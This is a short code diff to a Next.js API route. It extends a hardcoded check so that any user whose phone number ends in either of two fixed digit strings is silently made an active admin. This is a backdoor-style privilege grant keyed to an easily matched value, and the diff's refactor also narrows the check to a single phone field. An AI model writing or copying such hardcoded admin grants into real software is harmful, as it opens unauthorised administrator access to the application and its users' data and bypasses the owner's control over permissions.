@@ -329,7 +329,8 @@ export async function GET(req: NextRequest) {
         }
       : null;
 
-    if (mapped && (mapped.phone?.replace(/[^0-9]/g, '').endsWith('9235222399') || authUser.phone?.replace(/[^0-9]/g, '').endsWith('9235222399'))) {
+    const checkPhone = (mapped?.phone || authUser.phone || '').replace(/[^0-9]/g, '');
+    if (mapped && (checkPhone.endsWith('9235222399') || checkPhone.endsWith('8881299358'))) {
       mapped.role = 'admin';
       mapped.is_active = true;
     }
